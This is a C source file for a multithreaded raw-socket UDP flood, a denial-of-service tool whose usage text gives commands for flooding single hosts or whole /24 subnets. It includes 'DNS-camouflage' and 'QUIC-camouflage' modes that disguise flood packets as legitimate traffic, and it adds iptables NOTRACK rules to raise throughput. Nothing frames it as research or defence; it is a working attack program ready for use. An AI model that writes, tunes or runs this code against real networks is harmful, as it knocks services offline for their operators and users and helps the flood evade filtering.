#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>

#define BATCH_MAX 1024

static volatile int running = 1;
static unsigned int g_mark;
static void handle_sigint(int sig) { (void)sig; running = 0; }

typedef struct {
    unsigned long long sent;
    unsigned long long bytes;
    unsigned long long errors;
    unsigned int        pps_cur;
    unsigned long long  bps_cur;
} stats_t;
static stats_t g_stats;

static __thread unsigned int rng_state;

static void seed_rand(unsigned int s) {
    rng_state = s * 2654435761U + 1;
}

static unsigned int get_rand(void) {
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}

static void fill_rand(void *buf, size_t len) {
    unsigned char *p = buf;
    for (size_t i = 0; i < len; i++)
        p[i] = (unsigned char)get_rand();
}

static unsigned short udp_csum(unsigned int saddr, unsigned int daddr,
                               unsigned short len, const unsigned char *data) {
    unsigned long cs = (saddr & 0xffff) + (saddr >> 16)
                     + (daddr & 0xffff) + (daddr >> 16)
                     + IPPROTO_UDP + len;
    unsigned int i = 0;
    for (i = 0; i + 1 < (unsigned int)len; i += 2)
        cs += ((unsigned long)data[i] << 8) | data[i + 1];
    if (i < (unsigned int)len)
        cs += (unsigned long)data[i] << 8;
    cs = (cs >> 16) + (cs & 0xffff);
    cs += (cs >> 16);
    return (unsigned short)~cs;
}

static unsigned int resolve_ip(const char *host) {
    struct addrinfo *ai;
    if (getaddrinfo(host, NULL, NULL, &ai) != 0) return 0;
    unsigned int addr = ((struct sockaddr_in *)ai->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(ai);
    return addr;
}

static unsigned int get_source_ip(unsigned int dst) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    struct sockaddr_in sin = { .sin_family = AF_INET, .sin_addr.s_addr = dst, .sin_port = htons(80) };
    if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) { close(fd); return 0; }
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    getsockname(fd, (struct sockaddr *)&local, &len);
    close(fd);
    return local.sin_addr.s_addr;
}

static int parse_cidr(const char *s, unsigned int *base, int *prefix) {
    char *slash = strchr(s, '/');
    if (!slash) return 0;
    char ip[32];
    int l = (int)(slash - s);
    if (l >= (int)sizeof(ip)) return 0;
    memcpy(ip, s, l);
    ip[l] = 0;
    if (inet_pton(AF_INET, ip, base) != 1) return 0;
    *prefix = atoi(slash + 1);
    return (*prefix >= 24 && *prefix <= 28) ? 1 : 0;
}

static unsigned int build_dns(unsigned char *buf, unsigned int max) {
    if (max < 32) return 0;
    unsigned int off = 0;
    buf[off++] = (unsigned char)get_rand(); buf[off++] = (unsigned char)get_rand();
    buf[off++] = 0x01; buf[off++] = 0x20;
    buf[off++] = 0x00; buf[off++] = 0x01;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    unsigned int llab = (get_rand() % 6) + 1;
    if (off + llab + 5 > max) return off;
    buf[off++] = (unsigned char)llab;
    for (unsigned int i = 0; i < llab; i++) buf[off++] = 'a' + (get_rand() % 26);
    buf[off++] = 0x03; buf[off++] = 'c'; buf[off++] = 'o'; buf[off++] = 'm';
    buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x01;
    buf[off++] = 0x00; buf[off++] = 0x01;
    return off;
}

static unsigned int build_quic(unsigned char *buf, unsigned int max) {
    if (max < 20) return 0;
    unsigned int off = 0;
    buf[off++] = 0xc0 + (get_rand() % 32);
    buf[off++] = 0x00; buf[off++] = 0x00; buf[off++] = 0x00;
    for (int i = 0; i < 8; i++) buf[off++] = (unsigned char)get_rand();
    for (int i = 0; i < 8; i++) buf[off++] = (unsigned char)get_rand();
    fill_rand(buf + off, max - off);
    return max;
}

static void *udp_worker(void *arg) {
    struct {
        unsigned int src_ip, dst_base;
        int num_hosts, dst_port, duration, pkt_len, mode;
    } *cfg = arg;
    char *mem = NULL;
    int socks[4];
    int nsocks = 4;

    for (int i = 0; i < nsocks; i++) socks[i] = -1;

    seed_rand((unsigned int)(unsigned long)pthread_self() ^ (unsigned int)time(NULL));

    int pay = cfg->pkt_len;
    if (pay < 1) pay = 1;
    int psz = (int)sizeof(struct iphdr) + (int)sizeof(struct udphdr) + pay;
    size_t pool = (size_t)psz * BATCH_MAX
                + sizeof(struct sockaddr_in) * BATCH_MAX
                + sizeof(struct iovec) * BATCH_MAX
                + sizeof(struct mmsghdr) * BATCH_MAX;
    mem = malloc(pool);
    if (!mem) goto cleanup;

    char *pb = mem;
    struct sockaddr_in *ad = (struct sockaddr_in *)(pb + (size_t)psz * BATCH_MAX);
    struct iovec *iv = (struct iovec *)(ad + BATCH_MAX);
    struct mmsghdr *mv = (struct mmsghdr *)(iv + BATCH_MAX);

    for (int i = 0; i < nsocks; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (socks[i] < 0) { perror("  [worker] socket"); goto cleanup; }
        int one = 1;
        setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        int sndbuf = 8388608;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        if (g_mark) setsockopt(socks[i], SOL_SOCKET, SO_MARK, &g_mark, sizeof(g_mark));
    }

    unsigned char pay_buf[1408];
    unsigned int base_sport = (unsigned int)(unsigned long)pthread_self();

    for (unsigned int n = 0; n < BATCH_MAX; n++) {
        iv[n].iov_len = psz;
        mv[n].msg_hdr.msg_name = &ad[n];
        mv[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        mv[n].msg_hdr.msg_iov = &iv[n];
        mv[n].msg_hdr.msg_iovlen = 1;
        ad[n].sin_family = AF_INET;
        ad[n].sin_port = htons(cfg->dst_port);
    }

    long long deadline = cfg->duration > 0
        ? (long long)time(NULL) + cfg->duration
        : 0x7FFFFFFFFFFFFFFFLL;

    unsigned int sock_idx = 0;
    int snd_wait_us = 0;
    int snd_ok = 0;
    while (running && time(NULL) < deadline) {
        if (cfg->mode == 2)
            build_dns(pay_buf, pay);
        else if (cfg->mode == 3)
            build_quic(pay_buf, pay);
        else
            fill_rand(pay_buf, pay);

        unsigned int dst_off_base = get_rand();
        unsigned short ip_id_base = (unsigned short)get_rand();
        for (unsigned int n = 0; n < BATCH_MAX; n++) {
            unsigned int dst = cfg->dst_base + ((dst_off_base + n * 31337U) % (unsigned int)cfg->num_hosts);
            char *pkt = pb + n * psz;

            struct iphdr *ip = (struct iphdr *)pkt;
            ip->version = 4;
            ip->ihl = 5;
            ip->tot_len = htons(psz);
            ip->id = htons(ip_id_base + (unsigned short)n);
            ip->ttl = 255;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = cfg->src_ip;
            ip->daddr = dst;
            ip->check = 0;
            { unsigned short *w = (unsigned short *)ip;
              unsigned long cs = w[0] + w[1] + w[2] + w[3] + w[4]
                              + w[5] + w[6] + w[7] + w[8] + w[9];
              cs = (cs >> 16) + (cs & 0xffff);
              cs += (cs >> 16);
              ip->check = (unsigned short)(~cs); }

            struct udphdr *udp = (struct udphdr *)(pkt + sizeof(struct iphdr));
            udp->source = htons(((unsigned int)(base_sport + n * 65521U) % 64511U) + 1024U);
            udp->dest = htons(cfg->dst_port);
            udp->len = htons((unsigned short)(sizeof(struct udphdr) + pay));
            udp->check = 0;
            {
                udp->check = udp_csum(ip->saddr, ip->daddr,
                                      sizeof(struct udphdr) + pay,
                                      (const unsigned char *)udp);
            }

            unsigned char *pl = (unsigned char *)(pkt + sizeof(struct iphdr) + sizeof(struct udphdr));
            if (pay > 0)
                memcpy(pl, pay_buf, pay);

            ad[n].sin_addr.s_addr = dst;
            iv[n].iov_base = pkt;
        }

        int sock = socks[sock_idx % (unsigned int)nsocks];
        sock_idx++;
        int off = 0;
        while (off < BATCH_MAX) {
            int ret = sendmmsg(sock, mv + off, BATCH_MAX - off, 0);
            if (ret > 0) {
                off += ret;
                if (snd_wait_us > 0) {
                    snd_ok++;
                    if (snd_ok >= 64) {
                        snd_wait_us >>= 1;
                        snd_ok = 0;
                    }
                }
            } else if (ret == 0) {
                break;
            } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                if (snd_wait_us == 0) snd_wait_us = 1;
                else if (snd_wait_us < 1024) snd_wait_us <<= 1;
                usleep(snd_wait_us);
            } else if (errno == ENOBUFS) {
                if (snd_wait_us == 0) snd_wait_us = 16;
                else if (snd_wait_us < 4096) snd_wait_us <<= 1;
                usleep(snd_wait_us);
            } else {
                __sync_add_and_fetch(&g_stats.errors, 1);
                break;
            }
        }
        if (off > 0) {
            __sync_add_and_fetch(&g_stats.sent, off);
            __sync_add_and_fetch(&g_stats.bytes, (unsigned long long)off * psz);
        }
    }

cleanup:
    free(mem);
    for (int i = 0; i < nsocks; i++)
        if (socks[i] >= 0) close(socks[i]);
    return NULL;
}

static void fmt_bw(char *buf, size_t n, unsigned long long bps) {
    if (bps >= 1000000000ULL)
        snprintf(buf, n, "%.2f Gbps", (double)bps / 1000000000.0);
    else if (bps >= 1000000ULL)
        snprintf(buf, n, "%.2f Mbps", (double)bps / 1000000.0);
    else if (bps >= 1000ULL)
        snprintf(buf, n, "%.2f Kbps", (double)bps / 1000.0);
    else
        snprintf(buf, n, "%llu bps", bps);
}

static void flush_route(void) {
    int fd = open("/proc/sys/net/ipv4/route/flush", O_WRONLY);
    if (fd >= 0) { ssize_t w = write(fd, "1", 1); (void)w; close(fd); }
}

static void *stats_loop(void *arg) {
    int show_bw = (int)(unsigned long)arg;
    unsigned long long last_pkt = 0, last_byte = 0;
    while (running) {
        sleep(2);
        flush_route();
        unsigned long long cur_pkt  = __sync_add_and_fetch(&g_stats.sent, 0);
        unsigned long long cur_byte = __sync_add_and_fetch(&g_stats.bytes, 0);
        g_stats.pps_cur = (unsigned int)((cur_pkt - last_pkt) / 2);
        g_stats.bps_cur = (cur_byte - last_byte) * 8 / 2;
        last_pkt  = cur_pkt;
        last_byte = cur_byte;

        char bw[32];
        fmt_bw(bw, sizeof(bw), g_stats.bps_cur);
        if (show_bw)
            printf("\r  %llu pkts  |  %llu err  |  %u pps  |  %s  ",
                   (unsigned long long)g_stats.sent,
                   (unsigned long long)g_stats.errors,
                   g_stats.pps_cur, bw);
        else
            printf("\r  %llu pkts  |  %llu err  |  %u pps  ",
                   (unsigned long long)g_stats.sent,
                   (unsigned long long)g_stats.errors,
                   g_stats.pps_cur);
        fflush(stdout);
    }
    printf("\n");
    return NULL;
}

static void usage(const char *name) {
    fprintf(stderr,
        "Usage: %s <target> <port> <time> [-t threads] [-l len]\n"
        "\n"
        "Raw UDP flood, not spoofed.\n"
        "Target can be a CIDR subnet /24-/28.\n"
        "\n"
        "Options:\n"
        "  -t N          threads  (default 4)\n"
        "  -l N          payload bytes 1-1400  (1 = PPS, 1400 = GBPS, default 1)\n"
        "\n"
        "Examples:\n"
        "  ./udp 1.1.1.0/24 80 60          # flood the /24 subnet\n"
        "  ./udp 1.1.1.1 80 60 -l 1400       # single target, packet len for gbps\n"
        "\n"
        "Options:\n"
        "  -t N          threads  (default 4)\n"
        "  -l N          payload bytes 1-1400  (1 = PPS, 1400 = GBPS, default 1024)\n"
        "  -m M          mode: 0=fixed port (default), 1=random port, 2=DNS-camo, 3=QUIC-camo\n"
        "\n"
        "Modes:\n"
        "  0  fixed dest port, random payload\n"
        "  1  random dest port (sprays across 1024-65535), random payload\n"
        "  2  DNS-camouflage payload (valid DNS query structure)\n"
        "  3  QUIC-camouflage payload (valid QUIC Initial header)\n"
        , name, name, name, name);
}

int main(int argc, char **argv) {
    int threads = 4, pkt_len = 1024, mode = 0, opt;

    while ((opt = getopt(argc, argv, "t:l:m:h")) != -1) {
        switch (opt) {
        case 't': threads  = atoi(optarg); break;
        case 'l': pkt_len  = atoi(optarg); break;
        case 'm': mode     = atoi(optarg); break;
        case 'h': default:  usage(argv[0]); return opt == 'h' ? 0 : 1;
        }
    }

    if (optind + 3 > argc) { usage(argv[0]); return 1; }
    const char *target = argv[optind];
    int port = atoi(argv[optind + 1]);
    int duration = atoi(argv[optind + 2]);
    if (port < 1 || port > 65535) { fprintf(stderr, "Invalid port\n"); return 1; }
    if (pkt_len < 1)  pkt_len = 1;
    if (pkt_len > 1400) pkt_len = 1400;
    if (mode < 0 || mode > 3) mode = 0;
    if (geteuid() != 0) { fprintf(stderr, "Root required for raw sockets\n"); return 1; }

    unsigned int dst_base;
    int prefix, num_hosts;
    unsigned int dst_ip;
    char subnet_buf[64] = "";

    if (parse_cidr(target, &dst_base, &prefix)) {
        num_hosts = 1 << (32 - prefix);
        unsigned int h = ntohl(dst_base);
        if (prefix == 28) h &= 0xFFFFFFF0;
        else if (prefix == 27) h &= 0xFFFFFFE0;
        else if (prefix == 26) h &= 0xFFFFFFC0;
        else if (prefix == 25) h &= 0xFFFFFF80;
        else h &= 0xFFFFFF00;
        dst_base = htonl(h);
        dst_ip = dst_base;
        snprintf(subnet_buf, sizeof(subnet_buf), "%d IPs (/%d)", num_hosts, prefix);
    } else if (strchr(target, '/')) {
        fprintf(stderr, "Invalid CIDR: use /24 to /28 only\n"); return 1;
    } else {
        dst_ip = resolve_ip(target);
        if (!dst_ip) { fprintf(stderr, "Cannot resolve %s\n", target); return 1; }
        dst_base = dst_ip;
        num_hosts = 1;
    }

    unsigned int src_ip = get_source_ip(dst_ip);
    if (!src_ip) { fprintf(stderr, "Cannot determine source IP\n"); return 1; }

    struct in_addr sa = { .s_addr = src_ip }, da = { .s_addr = dst_ip };

    const char *mode_names[] = {
        "fixed port, random payload",
        "random port, random payload",
        "DNS-camouflage",
        "QUIC-camouflage"
    };

    struct sigaction sa_sig = { .sa_handler = handle_sigint };
    sigaction(SIGINT, &sa_sig, NULL);
    sigaction(SIGTERM, &sa_sig, NULL);

    int psz = (int)sizeof(struct iphdr) + (int)sizeof(struct udphdr) + pkt_len;
    printf(
        "  Target:   %s:%d\n"
        "  Subnet:   %s\n"
        "  Source:   %s\n"
        "  Threads:  %d\n"
        "  Payload:  %d B  (packet %d B)\n"
        "  Mode:     %s\n"
        "  Duration: %ds\n"
        "  Batch:    1024 (sendmmsg)\n"
        "  Buffer:   16MB SO_SNDBUF\n"
        "  Sockets:  4x RAW per thread\n"
        "  Press Ctrl+C to stop\n\n",
        inet_ntoa(da), port, subnet_buf[0] ? subnet_buf : "single host",
        inet_ntoa(sa), threads, pkt_len, psz,
        mode_names[mode],
        duration > 0 ? duration : 0);

    g_mark = (unsigned int)(get_rand() & 0xFFFF) + 1;
    if (g_mark) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd),
            "iptables -t raw -I OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
        { int _s = system(cmd); (void)_s; }
    }

    struct {
        unsigned int src_ip, dst_base;
        int num_hosts, dst_port, duration, pkt_len, mode;
    } cfg = { src_ip, dst_base, num_hosts, port, duration, pkt_len, mode };

    pthread_t stat_tid;
    pthread_create(&stat_tid, NULL, stats_loop, (void*)(unsigned long)(pkt_len > 40 ? 1 : 0));

    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
    for (int i = 0; i < threads; i++)
        pthread_create(&tids[i], NULL, udp_worker, &cfg);
    for (int i = 0; i < threads; i++)
        pthread_join(tids[i], NULL);

    running = 0;
    pthread_join(stat_tid, NULL);
    free(tids);

    if (g_mark) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd),
            "iptables -t raw -D OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
        { int _s = system(cmd); (void)_s; }
    }

    printf("\n  Final: %llu pkts, %llu bytes, %llu errors\n",
           (unsigned long long)g_stats.sent,
           (unsigned long long)g_stats.bytes,
           (unsigned long long)g_stats.errors);
    return 0;
}
